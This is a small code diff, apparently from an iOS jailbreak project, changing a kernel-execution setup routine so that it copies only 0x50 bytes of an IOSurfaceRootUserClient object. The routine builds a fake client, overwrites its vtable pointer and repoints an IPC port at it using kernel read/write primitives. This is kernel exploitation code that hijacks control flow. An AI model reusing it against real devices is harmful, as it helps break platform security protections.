@@ -87,8 +87,8 @@ bool init_kexec() {
         return false;
     }
     puts("kexec: copying fake client");
-    kread(IOSurfaceRootUserClient_addr, buffer, buffer_size);
-    kwrite(fake_client, buffer, buffer_size);
+    kread(IOSurfaceRootUserClient_addr, buffer, 0x50);
+    kwrite(fake_client, buffer, 0x50);
     puts("kexec: overwriting user client");
     kwrite_uint64(fake_client, fake_vtable);
     kwrite_uint64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
